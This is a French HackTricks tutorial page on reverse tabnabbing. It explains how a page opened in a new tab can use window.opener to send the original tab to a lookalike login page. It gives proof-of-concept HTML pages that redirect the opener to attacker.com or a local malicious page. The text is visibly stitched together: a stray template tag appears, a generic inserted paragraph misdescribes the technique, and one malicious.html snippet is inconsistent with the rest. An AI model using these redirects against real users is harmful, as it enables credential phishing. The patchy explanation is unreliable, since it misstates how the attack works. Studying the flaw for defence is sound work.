<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de cybersécurité? Voulez-vous voir votre entreprise annoncée dans HackTricks? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF? Consultez les PLANS D'ABONNEMENT!

- Découvrez The PEASS Family, notre collection exclusive de NFTs

- Obtenez le swag officiel PEASS & HackTricks

- Rejoignez le groupe Discord ou le groupe Telegram ou suivez-moi sur Twitter @carlospolopm.

- Partagez vos astuces de piratage en soumettant des PR au repo hacktricks et hacktricks-cloud.

</details>


# Description

Dans une situation où un attaquant peut contrôler l'argument `href` d'une balise `<a>` avec l'attribut `target="_blank" rel="opener"` qui va être cliquée par une victime, l'attaquant pointe ce lien vers un site web sous son contrôle (un site web malveillant). Ensuite, une fois que la victime clique sur le lien et accède au site web de l'attaquant, ce site web malveillant sera capable de contrôler la page originale via l'objet javascript `window.opener`. Si la page ne contient pas `rel="opener"` mais contient `target="_blank"` et n'a pas non plus `rel="noopener"`, elle peut également être vulnérable.

Une façon courante d'exploiter ce comportement serait de changer l'emplacement du site web original via `window.opener.location = https://attacker.com/victim.html` vers un site web contrôlé par l'attaquant qui ressemble à l'original, de sorte qu'il peut imiter le formulaire de connexion du site web original et demander des informations d'identification à l'utilisateur.

Cependant, notez que comme l'attaquant peut maintenant contrôler l'objet de fenêtre du site web original, il peut l'exploiter de différentes manières pour effectuer des attaques plus discrètes (peut-être en modifiant les événements javascript pour exfiltrer des informations vers un serveur contrôlé par lui ?)

# Aperçu

## Avec lien de retour

Lien entre les pages parent et enfant lorsque l'attribut de prévention n'est pas utilisé :

![](https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png)

## Sans lien de retour

Lien entre les pages parent et enfant lorsque l'attribut de prévention est utilisé :

![](https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png)

## Exemples <a href="#examples" id="examples"></a>

Créez les pages suivantes dans un dossier et exécutez un serveur web avec `python3 -m http.server`\
Ensuite, accédez à `http://127.0.0.1:8000/`vulnerable.html, cliquez sur le lien et notez comment l'URL du site web original change.
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% endcode %}

{% code title="malicious.html" %}

```html
<a href="https://example.com" target="_blank" rel="noopener noreferrer" onclick="window.opener.location='https://attacker.com'">Click me!</a>
```

{% endcode %}

Le reverse tab nabbing est une technique d'attaque qui consiste à modifier le comportement par défaut des liens hypertextes pour rediriger l'utilisateur vers un site malveillant. Cette technique est souvent utilisée pour voler des informations d'identification ou pour exécuter du code malveillant sur le navigateur de la victime.

Le reverse tab nabbing fonctionne en exploitant le comportement par défaut des liens hypertextes qui s'ouvrent dans un nouvel onglet ou une nouvelle fenêtre. En modifiant le code HTML d'un lien hypertexte pour inclure un script malveillant, un attaquant peut rediriger l'utilisateur vers un site malveillant tout en gardant le site d'origine ouvert dans un onglet ou une fenêtre différente.

Pour se protéger contre le reverse tab nabbing, les utilisateurs doivent être conscients des liens hypertextes qu'ils cliquent et éviter de cliquer sur des liens suspects ou non fiables. Les développeurs peuvent également protéger leurs sites en ajoutant l'attribut `rel="noopener noreferrer"` aux liens hypertextes qui s'ouvrent dans un nouvel onglet ou une nouvelle fenêtre. Cela empêchera le script malveillant d'accéder à la fenêtre parente et de rediriger l'utilisateur vers un site malveillant.
```markup
<!DOCTYPE html>
<html>
 <body>
  <script>
  window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
  </script>
 </body>
</html>
```
{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
## Propriétés accessibles <a href="#accessible-properties" id="accessible-properties"></a>

Le site malveillant ne peut accéder qu'aux propriétés suivantes de l'objet de référence javascript **opener** (qui est en fait une référence à une instance de la classe javascript **window**) en cas d'accès **cross origin** (entre différents domaines) :

* `opener.closed` : Renvoie une valeur booléenne indiquant si une fenêtre a été fermée ou non.
* `opener.frames` : Renvoie tous les éléments iframe dans la fenêtre actuelle.
* `opener.length` : Renvoie le nombre d'éléments iframe dans la fenêtre actuelle.
* `opener.opener` : Renvoie une référence à la fenêtre qui a créé la fenêtre.
* `opener.parent` : Renvoie la fenêtre parent de la fenêtre actuelle.
* `opener.self` : Renvoie la fenêtre actuelle.
* `opener.top` : Renvoie la fenêtre de navigateur la plus haute.

Si les domaines sont identiques, le site malveillant peut accéder à toutes les propriétés exposées par l'objet de référence javascript [**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window).

# Prévention

Les informations de prévention sont documentées dans la [feuille de triche HTML5](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing).

# Références

{% embed url="https://owasp.org/www-community/attacks/Reverse_Tabnabbing" %}




<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
